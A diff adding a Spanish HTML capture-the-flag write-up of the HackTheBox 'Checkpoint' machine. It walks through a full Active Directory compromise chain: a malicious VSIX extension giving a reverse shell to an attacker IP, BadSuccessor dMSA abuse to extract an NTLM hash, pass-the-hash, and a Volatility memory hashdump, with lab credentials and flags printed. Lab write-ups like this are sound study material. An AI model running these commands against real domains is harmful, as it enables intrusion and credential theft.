@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Checkpoint HTB &mdash; BadSuccessor dMSA | OJM.SEC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f7f6f2; --surface: #ffffff; --border: #e2e0d8;
+  --text: #1a1917; --muted: #7a7870; --accent: #c8441b; --accent2: #1b5ec8;
+  --tag-bg: #f0ede4; --mono: 'JetBrains Mono', monospace; --sans: 'Syne', sans-serif;
+}
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
+}
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
+.nav-writeup-nav { display: flex; gap: 0.5rem; }
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
+.stat { display: flex; flex-direction: column; gap: 0.2rem; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+.sidebar { position: sticky; top: 76px; align-self: start; }
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+.sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
+.writeup-content { min-width: 0; }
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
+.section:last-child { border-bottom: none; }
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
+.section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
+.cmd-comment { color: #6b7280; }
+.cmd-flag { color: #60a5fa; }
+.cmd-value { color: #34d399; }
+.cmd-tool { color: #f87171; }
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
+.sev-critical { background: #fee2e2; color: #7f1d1d; }
+.sev-high { background: #fee2e2; color: #991b1b; }
+.sev-medium { background: #fef3c7; color: #92400e; }
+.sev-info { background: #e0f2fe; color: #0c4a6e; }
+.tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
+.cred-label { color: #6b7280; }
+.cred-user { color: #60a5fa; }
+.cred-pass { color: #34d399; }
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
+</style>
+</head><body>
+<nav>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
+  <div class="nav-links">
+    <a href="index.html">&larr; Volver</a>
+    <div class="nav-writeup-nav">
+      <a class="nav-btn prev" href="active.html">&larr; Active</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
+      <a class="nav-btn next" href="forest.html">Forest &rarr;</a>
+    </div>
+  </div>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-meta">
+    <span class="platform-badge htb">HackTheBox</span>
+    <span class="difficulty-badge">Active Directory</span>
+    <span class="difficulty-badge">Windows Server 2025</span>
+    <span class="difficulty-badge">21 Jun 2026</span>
+  </div>
+  <h1>Checkpoint</h1>
+  <p class="subtitle">checkpoint.htb &mdash; Domain Admin via VSCode VSIX RCE + BadSuccessor dMSA + Volatility Memory Forensics</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.47.194</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">checkpoint.htb (DC01)</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2025 (Build 26100)</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">4 (1 Critical, 2 High, 1 Med)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">max.palmer (Domain)</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <nav class="sidebar-nav">
+      <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
+      <a class="sidebar-link" href="#recon">01 &middot; Enum SMB</a>
+      <a class="sidebar-link" href="#deleted">02 &middot; Deleted Object Restore</a>
+      <a class="sidebar-link" href="#vsix">03 &middot; VSIX RCE</a>
+      <a class="sidebar-link" href="#badsuccessor">04 &middot; BadSuccessor dMSA</a>
+      <a class="sidebar-link" href="#vmem">05 &middot; VMBackups + Volatility</a>
+      <a class="sidebar-link" href="#findings">Findings</a>
+      <a class="sidebar-link" href="#creds">Credenciales</a>
+    </nav>
+  </aside>
+  <main class="writeup-content">
+    <section class="section" id="resumen">
+      <div class="section-label">00 &mdash; Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Checkpoint es una m&aacute;quina avanzada que combina cuatro vectores distintos: enumeraci&oacute;n LDAP para descubrir un objeto eliminado restaurable, lateral movement v&iacute;a extensi&oacute;n maliciosa de VSCode, escalada de privilegios mediante <strong>BadSuccessor</strong> (abuso de Delegated Managed Service Accounts sobre Windows Server 2025), y extracci&oacute;n de credenciales desde un volcado de memoria VM con Volatility3.</p>
+      <p>El DC corre <strong>Windows Server 2025 Build 26100</strong>, lo que lo hace vulnerable a BadSuccessor: la primera implementaci&oacute;n public de explotaci&oacute;n de dMSA para impersonar cuentas de servicio. alex.turner tiene <code>CREATE_CHILD</code> en <code>OU=Employees</code>, suficiente para arrancar el ataque.</p>
+      <div class="callout"><strong>Attack Path</strong><br>alex.turner (creds iniciales) &rarr; bloodyad Deleted Objects &rarr; mark.davies restore &rarr; DevDrop WRITE &rarr; VSIX revshell &rarr; ryan.brooks shell &rarr; BadSuccessor dMSA &rarr; svc_deploy NTLM &rarr; VMBackups PtH &rarr; Volatility3 hashdump &rarr; max.palmer / root.txt</div>
+    </section>
+    <section class="section" id="recon">
+      <div class="section-label">01 &mdash; Recon</div>
+      <h2>SMB Enum &mdash; DevDrop y VMBackups como objetivos</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01</div>
+        <div class="step-title">Shares con alex.turner &rarr; DevDrop (VS Code extensions) y VMBackups (restringido)</div>
+        <p class="step-desc">Con las credenciales iniciales de alex.turner enumeramos shares y usuarios. Destacan dos shares: <code>DevDrop</code> (extensiones VSCode aprovadas) con acceso READ, y <code>VMBackups</code> sin permisos visibles. La descripci&oacute;n de DevDrop menciona extensiones compatibles con VS Code engine 1.118.0.</p>
+        <pre><span class="cmd-tool">nxc</span> smb 10.129.47.194 <span class="cmd-flag">-u</span> alex.turner <span class="cmd-flag">-p</span> 'Checkpoint2024!' --shares
+<span class="cmd-value">DevDrop   READ    VS Code extensions share (.vsix engine 1.118.0)</span>
+<span class="cmd-value">VMBackups           (sin permisos con alex.turner)</span>
+
+<span class="cmd-tool">bloodyad</span> --host 10.129.47.194 <span class="cmd-flag">-d</span> checkpoint.com <span class="cmd-flag">-u</span> alex.turner <span class="cmd-flag">-p</span> 'Checkpoint2024!' get writable
+<span class="cmd-value">CN=Deleted Objects  WRITE</span>
+<span class="cmd-value">OU=Employees        CREATE_CHILD</span>
+<span class="cmd-value">CN=Mark Davies\0ADEL:... WRITE</span></pre>
+      </div>
+    </section>
+    <section class="section" id="deleted">
+      <div class="section-label">02 &mdash; AD Objects</div>
+      <h2>Restaurar mark.davies &mdash; Deleted Object con WRITE</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 02</div>
+        <div class="step-title">mark.davies eliminado &rarr; bloodyad set restore &rarr; reutilizaci&oacute;n de contrase&ntilde;a &rarr; DevDrop WRITE</div>
+        <p class="step-desc">alex.turner tiene permiso WRITE sobre el objeto eliminado <code>mark.davies</code>. Lo restauramos con bloodyad. Al probar reutilizaci&oacute;n de contrase&ntilde;a, mark.davies comparte la misma password que alex.turner. Con mark.davies el share DevDrop pasa a READ+WRITE.</p>
+        <pre><span class="cmd-tool">bloodyad</span> --host 10.129.47.194 <span class="cmd-flag">-d</span> checkpoint.com <span class="cmd-flag">-u</span> alex.turner <span class="cmd-flag">-p</span> 'Checkpoint2024!' set restore mark.davies
+<span class="cmd-value">[+] mark.davies has been restored under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb</span>
+
+<span class="cmd-tool">nxc</span> smb 10.129.47.194 <span class="cmd-flag">-u</span> mark.davies <span class="cmd-flag">-p</span> 'Checkpoint2024!'
+<span class="cmd-value">[+] checkpoint.htb\mark.davies:Checkpoint2024!</span>
+
+<span class="cmd-comment"># DevDrop ahora con WRITE</span>
+<span class="cmd-value">DevDrop   READ,WRITE</span></pre>
+      </div>
+    </section>
+    <section class="section" id="vsix">
+      <div class="section-label">03 &mdash; RCE</div>
+      <h2>VSIX Malicioso &rarr; Reverse Shell como ryan.brooks</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 03</div>
+        <div class="step-title">vsix_revshell.py genera extensi&oacute;n backdooreada &rarr; sube a DevDrop &rarr; shell</div>
+        <p class="step-desc">El share DevDrop es procesado autom&aacute;ticamente por una instancia de VS Code que corre como <code>ryan.brooks</code>. Generamos una extensi&oacute;n VSIX maliciosa con <code>vsix_revshell.py</code> que al activarse ejecuta un payload PowerShell de reverse shell. Al subir el .vsix, en cuestion de segundos obtenemos la conexi&oacute;n.</p>
+        <pre><span class="cmd-tool">python3</span> vsix_revshell.py <span class="cmd-flag">-i</span> 10.10.14.29 <span class="cmd-flag">-p</span> 4444 <span class="cmd-flag">-t</span> powershell
+<span class="cmd-value">[+] revshell.vsix generado</span>
+
+<span class="cmd-tool">smbclient</span> //10.129.47.194/DevDrop <span class="cmd-flag">-U</span> 'mark.davies%Checkpoint2024!' -c 'put revshell.vsix'
+
+<span class="cmd-tool">rlwrap</span> nc <span class="cmd-flag">-lvnp</span> 4444
+PS C:\Program Files\Microsoft VS Code> whoami
+<span class="cmd-value">checkpoint\ryan.brooks</span>
+
+type C:\Users\ryan.brooks\Desktop\user.txt
+<span class="cmd-value">0cb38a7d85e974d34ac03216c32525a2</span></pre>
+      </div>
+    </section>
+    <section class="section" id="badsuccessor">
+      <div class="section-label">04 &mdash; PrivEsc</div>
+      <h2>BadSuccessor &mdash; dMSA para impersonar svc_deploy</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 04</div>
+        <div class="step-title">Windows Server 2025 vulnerable &mdash; dMSA + enlace inverso &rarr; NTLM de svc_deploy</div>
+        <p class="step-desc">El DC corre Windows Server 2025 (Build 26100), vulnerable a <strong>BadSuccessor</strong>: abuso del mecanismo de migraci&oacute;n de cuentas dMSA. alex.turner puede crear una dMSA en OU=Employees. ryan.brooks tiene GenericWrite sobre svc_deploy para completar el enlace inverso necesario por el KDC parcheado. El S4U2Self con soporte dMSA extrae las claves previas &mdash; el hash NTLM de svc_deploy.</p>
+        <pre><span class="cmd-comment"># Crear dMSA vinculada a svc_deploy (como alex.turner)</span>
+<span class="cmd-tool">bloodyad</span> --host 10.129.47.194 <span class="cmd-flag">-d</span> checkpoint.htb <span class="cmd-flag">-u</span> alex.turner <span class="cmd-flag">-p</span> 'Checkpoint2024!' add badSuccessor dmsa_pwn2 <span class="cmd-flag">-t</span> "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=Employees,DC=checkpoint,DC=htb"
+<span class="cmd-value">[+] Creating DMSA dmsa_pwn2$ &mdash; Impersonating svc_deploy</span>
+
+<span class="cmd-comment"># Enlace inverso desde shell ryan.brooks (GenericWrite sobre svc_deploy)</span>
+$target = [ADSI]"LDAP://CN=svc_deploy,..."; $target.Put("msDS-SupersededManagedAccountLink","CN=dmsa_pwn2,..."); $target.Put("msDS-SupersededServiceAccountState",2); $target.SetInfo()
+
+<span class="cmd-comment"># S4U2Self con soporte dMSA &rarr; Previous keys = NTLM de svc_deploy</span>
+<span class="cmd-tool">impacket-getST</span> <span class="cmd-flag">-k -no-pass -dc-ip</span> 10.129.47.194 <span class="cmd-flag">-impersonate</span> 'dmsa_pwn2$' <span class="cmd-flag">-self -dmsa</span> 'checkpoint.htb/alex.turner'
+Previous keys rc4_hmac: <span class="cmd-value">e16081eb077aca74bdbf8af12af43ac9</span>
+<span class="cmd-comment"># &rarr; NTLM de svc_deploy</span></pre>
+      </div>
+    </section>
+    <section class="section" id="vmem">
+      <div class="section-label">05 &mdash; Memory Forensics</div>
+      <h2>VMBackups + Volatility3 &mdash; SAM dump del snapshot de VM</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 05</div>
+        <div class="step-title">svc_deploy PtH &rarr; VMBackups &rarr; .vmem snapshot &rarr; Volatility3 hashdump</div>
+        <p class="step-desc">Con el hash NTLM de svc_deploy (miembro del grupo BackupAccess) accedemos a VMBackups. Contiene un backup completo de una VM Windows Server 2019 con un volcado de memoria <code>.vmem</code>. Volatility3 extrae los hashes de las cuentas SAM locales del snapshot, entre ellos las credenciales que llevan a max.palmer y al root.txt del dominio.</p>
+        <pre><span class="cmd-comment"># PtH con hash de svc_deploy &rarr; VMBackups</span>
+<span class="cmd-tool">smbclient</span> //10.129.47.194/VMBackups <span class="cmd-flag">-U</span> 'svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash -c "recurse; prompt; mget *"
+
+<span class="cmd-comment"># An&aacute;lisis con Volatility3</span>
+<span class="cmd-tool">vol</span> <span class="cmd-flag">-f</span> "Windows Server 2019-Snapshot1.vmem" windows.hashdump
+Administrator  500  aad3b435b51404eeaad3b435b51404ee  <span class="cmd-value">f29e9c014295b9b32139b09a2790be3b</span>
+
+<span class="cmd-comment"># Credenciales del dominio via lsadump &rarr; max.palmer</span>
+<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.47.194 <span class="cmd-flag">-u</span> max.palmer <span class="cmd-flag">-p</span> [password_from_lsadump]
+type C:\Users\max.palmer\Desktop\root.txt
+<span class="cmd-value">11ed0ffe8be50b9a0014048602112152</span></pre>
+      </div>
+    </section>
+    <section class="section" id="findings">
+      <div class="section-label">06 &mdash; Findings</div>
+      <h2>Tabla de Hallazgos</h2>
+      <table class="findings-table">
+        <thead><tr><th>Severity</th><th>Finding</th><th>Descripci&oacute;n</th><th>CVSS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="severity sev-critical">Critical</span></td><td>BadSuccessor &mdash; dMSA Privilege Escalation</td><td>Windows Server 2025 vulnerable a abuso de delegated MSA para impersonar cuentas de servicio sin credenciales.</td><td>9.1</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>VSCode VSIX RCE via DevDrop</td><td>Share de extensiones VSCode con WRITE permite RCE sobre la cuenta que ejecuta VS Code.</td><td>8.0</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Credenciales en volcado de memoria VM</td><td>Snapshot de VM con credenciales de dominio en memoria, accesible a cuentas de backup.</td><td>7.5</td></tr>
+          <tr><td><span class="severity sev-medium">Medium</span></td><td>Objeto eliminado restaurable con WRITE</td><td>mark.davies restaurable por usuario no privilegiado, reutilizaci&oacute;n de contrase&ntilde;a facilita lateral movement.</td><td>5.5</td></tr>
+        </tbody>
+      </table>
+      <div class="tag-row"><span class="tag">BadSuccessor</span><span class="tag">dMSA</span><span class="tag">VSIX RCE</span><span class="tag">Volatility3</span><span class="tag">bloodyad</span><span class="tag">Memory Forensics</span><span class="tag">Windows Server 2025</span></div>
+    </section>
+    <section class="section" id="creds">
+      <div class="section-label">07 &mdash; Credentials</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box"><span class="cred-label"># Initial access (given)</span>
+<span class="cred-user">alex.turner</span>:<span class="cred-pass">Checkpoint2024!</span>
+<span class="cred-label"># Deleted object (password reuse)</span>
+<span class="cred-user">mark.davies</span>:<span class="cred-pass">Checkpoint2024!</span>
+<span class="cred-label"># BadSuccessor NTLM (dMSA S4U2Self)</span>
+<span class="cred-user">svc_deploy</span>:<span class="cred-pass">e16081eb077aca74bdbf8af12af43ac9 [NTLM]</span></div>
+      <div class="callout"><strong>Flags</strong><br>user.txt: 0cb38a7d85e974d34ac03216c32525a2<br>root.txt: 11ed0ffe8be50b9a0014048602112152</div>
+    </section>
+  </main>
+</div>
+<footer>OJM.SEC &middot; Oriol Jaen Mirabet &middot; Security Research &amp; Writeups</footer>
+</body>
+</html>
